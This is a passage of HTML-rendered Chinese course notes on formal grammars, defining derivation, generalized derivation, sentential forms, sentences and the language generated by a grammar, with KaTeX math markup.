style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.078596em;vertical-align:-0.25em;\"></span><span class=\"minner\"><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.828596em;\"><span style=\"top:-3.2029em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>时，我们可以说：<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi><mi>A</mi><mi>y</mi><mo>⇒</mo><mi>x</mi><mi>α</mi><mi>y</mi></mrow><annotation encoding=\"application/x-tex\">xAy\\Rightarrow x\\alpha y</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\">A</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.625em;vertical-align:-0.19444em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"mord mathdefault\" style=\"margin-right:0.03588em;\">y</span></span></span></span>。即，从左直接推导到右，仅使用一次规则。</p>\n<h4 id=\"推导的定义\"><a class=\"markdownIt-Anchor\" href=\"#推导的定义\"></a> 推导的定义</h4>\n<p>若存在一个直接推导序列：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>α</mi><mn>0</mn></msub><mo>⇒</mo><msub><mi>α</mi><mn>1</mn></msub><mo>⇒</mo><msub><mi>α</mi><mn>2</mn></msub><mo>⇒</mo><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><mi mathvariant=\"normal\">.</mi><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">\\alpha_{0}\\Rightarrow \\alpha_{1}\\Rightarrow \\alpha_{2}\\Rightarrow ... \\alpha_{n}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">⇒</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\">.</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span></span></p>\n<p>则说这个序列是从<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>α</mi><mn>0</mn></msub></mrow><annotation encoding=\"application/x-tex\">\\alpha_{0}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>到<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">\\alpha_{n}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>、长度为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>n</mi></mrow><annotation encoding=\"application/x-tex\">n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">n</span></span></span></span>的推导，记之为：<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>α</mi><mn>0</mn></msub><mover><mo><mo>⇒</mo></mo><mo>+</mo></mover><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">\\alpha_{0} \\stackrel{+}{\\Rightarrow} \\alpha_{n}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.225201em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.075201em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">+</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>。长度大于等于1。</p>\n<h4 id=\"广义推导\"><a class=\"markdownIt-Anchor\" href=\"#广义推导\"></a> 广义推导</h4>\n<p>广义推导记为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msub><mi>α</mi><mn>0</mn></msub><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><msub><mi>α</mi><mi>n</mi></msub></mrow><annotation encoding=\"application/x-tex\">\\alpha_{0} \\stackrel{*}{\\Rightarrow} \\alpha_{n}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.142566em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">0</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.0037em;\">α</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.151392em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\">n</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span>。与之前的推导相比，多了一个<strong>推出自己</strong>的行为。长度大于等于0。</p>\n<h4 id=\"句型\"><a class=\"markdownIt-Anchor\" href=\"#句型\"></a> 句型</h4>\n<p>设有文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mrow><mo fence=\"true\">[</mo><mi>S</mi><mo fence=\"true\">]</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G\\left[S\\right]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">[</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">]</span></span></span></span></span>，若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">S \\stackrel{*}{\\Rightarrow}x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">x</span></span></span></span>，且<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi><mo>∈</mo><mo stretchy=\"false\">(</mo><msub><mi>V</mi><mi>N</mi></msub><mo>∪</mo><msub><mi>V</mi><mi>T</mi></msub><msup><mo stretchy=\"false\">)</mo><mo>∗</mo></msup></mrow><annotation encoding=\"application/x-tex\">x \\in (V_{N}\\cup V_{T})^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.10903em;\">N</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">∪</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\"><span class=\"mclose\">)</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span></span></span></span>时，称符号串<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">x</span></span></span></span>为文法的<strong>句型</strong>。</p>\n<h4 id=\"句子\"><a class=\"markdownIt-Anchor\" href=\"#句子\"></a> 句子</h4>\n<p>设有文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mrow><mo fence=\"true\">[</mo><mi>S</mi><mo fence=\"true\">]</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G\\left[S\\right]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">[</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">]</span></span></span></span></span>，若<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>S</mi><mover><mo><mo>⇒</mo></mo><mo>∗</mo></mover><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">S \\stackrel{*}{\\Rightarrow}x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.992566em;vertical-align:0em;\"></span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\"><span class=\"mop op-limits\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.992566em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span><span class=\"mop\">⇒</span></span></span><span style=\"top:-3.5668699999999998em;margin-left:0em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">x</span></span></span></span>，且<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi><mo>∈</mo><msubsup><mi>V</mi><mi>T</mi><mo>∗</mo></msubsup></mrow><annotation encoding=\"application/x-tex\">x \\in  V_{T}^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.5782em;vertical-align:-0.0391em;\"></span><span class=\"mord mathdefault\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.964027em;vertical-align:-0.275331em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-2.424669em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.275331em;\"><span></span></span></span></span></span></span></span></span></span>时，称符号串<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>x</mi></mrow><annotation encoding=\"application/x-tex\">x</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.43056em;vertical-align:0em;\"></span><span class=\"mord mathdefault\">x</span></span></span></span>为文法的<strong>句子</strong>。</p>\n<h4 id=\"语言-2\"><a class=\"markdownIt-Anchor\" href=\"#语言-2\"></a> 语言</h4>\n<p>文法<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>G</mi><mrow><mo fence=\"true\">[</mo><mi>S</mi><mo fence=\"true\">]</mo></mrow></mrow><annotation encoding=\"application/x-tex\">G\\left[S\\right]</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">[</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">]</span></span></span></span></span>所产生的所有<strong>句子</strong>的集合称为文法定义的<strong>语言</strong>，记为<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><mi>G</mi><mrow><mo fence=\"true\">[</mo><mi>S</mi><mo fence=\"true\">]</mo></mrow><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">L\\left(G\\left[S\\right]\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">[</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">]</span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span></p>\n<ol>\n<li>文法给定后，语言就确定了。</li>\n<li><span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><mi>L</mi><mrow><mo fence=\"true\">(</mo><mi>G</mi><mrow><mo fence=\"true\">[</mo><mi>S</mi><mo fence=\"true\">]</mo></mrow><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">L\\left(G\\left[S\\right]\\right)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathdefault\">L</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">(</span><span class=\"mord mathdefault\">G</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"minner\"><span class=\"mopen delimcenter\" style=\"top:0em;\">[</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mclose delimcenter\" style=\"top:0em;\">]</span></span><span class=\"mclose delimcenter\" style=\"top:0em;\">)</span></span></span></span></span>是<span class=\"katex\"><span class=\"katex-mathml\"><math><semantics><mrow><msubsup><mi>V</mi><mi>T</mi><mo>∗</mo></msubsup></mrow><annotation encoding=\"application/x-tex\">V_{T}^{*}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.964027em;vertical-align:-0.275331em;\"></span><span class=\"mord\"><span class=\"mord mathdefault\" style=\"margin-right:0.22222em;\">V</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.688696em;\"><span style=\"top:-2.424669em;margin-left:-0.22222em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">T</span></span></span></span><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">∗</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.275331em;\"><span></span></span></span></span></span></span></span></span></span>的<strong>子集</strong>。</li>\n</ol>\n<h3 id=\"规范推导和规范规约\"><a class=\"markdownIt-Anchor\" href=\"#规范推导和规范规约\"></a> 